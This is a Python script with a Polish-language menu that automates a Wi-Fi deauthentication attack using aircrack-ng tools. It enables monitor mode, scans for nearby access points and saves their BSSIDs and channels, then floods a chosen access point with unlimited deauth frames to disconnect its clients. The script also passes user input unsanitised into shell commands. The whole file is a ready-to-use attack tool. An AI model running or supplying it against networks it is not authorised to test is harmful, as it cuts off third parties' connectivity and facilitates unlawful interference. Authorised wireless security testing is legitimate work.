import os
import subprocess
import sys

def get_active_interface():
    interface_name = subprocess.getoutput("ip link | grep -Eo '^[0-9]+: wl[^:]+' | awk -F': ' '{print $2}' | tr -d ':'")
    interface_name = interface_name.strip()  # Usuwanie białych znaków
    return interface_name

def press_to_continue():
    input("Naciśnij Enter, aby kontynuować...")

def start_monitor_mode(interface_name):
    os.system(f"sudo airmon-ng start {interface_name}")

def capture_bssid(interface_name):
    os.system(f"sudo timeout 5 airodump-ng {interface_name}mon > airodump.txt")
    os.system("grep -E '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}' airodump.txt | awk '$6 ~ /^[1-9][0-9]*$/ && $11 !~ /^</ {print $1, $6, $11}' | sort | uniq > bssid.txt")
    os.system("rm airodump.txt")
    with open("bssid.txt", "r") as file:
        print(file.read())

def set_channel(interface_name, channel):
    os.system(f"sudo iw {interface_name}mon set channel {channel}")

def deauth_attack(interface_name, bssid):
    os.system(f"sudo aireplay-ng --deauth 0 -a {bssid} {interface_name}mon")

def stop_monitor_mode(interface_name_mon):
    os.system(f"sudo airmon-ng stop {interface_name_mon}")
    os.system("sudo systemctl restart NetworkManager")

def main():
    interface_name = get_active_interface()
    while True:
        print("\n1) Przechwyc BSSID.")
        print("2) Wybierz kanał.")
        print("3) Atak deauth.")
        print("0) Zakończ działanie programu.")
        
        choice = input("Wybierz opcję: ")
        
        if choice == "1":
            start_monitor_mode(interface_name)
            capture_bssid(interface_name)
            press_to_continue()
        elif choice == "2":
            channel = input("Wpisz numer kanału, na którym chcesz przeprowadzić atak deauth: ")
            set_channel(interface_name, channel)
            press_to_continue()
        elif choice == "3":
            with open("bssid.txt", "r") as file:
                print(file.read())
            bssid = input("Podaj BSSID, na którym chcesz przeprowadzić atak deauth: ")
            deauth_attack(interface_name, bssid)
            press_to_continue()
        elif choice == "0":
            interface_name_mon = get_active_interface()
            stop_monitor_mode(interface_name_mon)
            os.system("rm bssid.txt")
            print("Wyjście.")
            break
        else:
            print("Nieprawidłowy wybór. Wybierz jeszcze raz, badź wybierz '0' aby wyjść!.")
            press_to_continue()

if __name__ == "__main__":
    main()

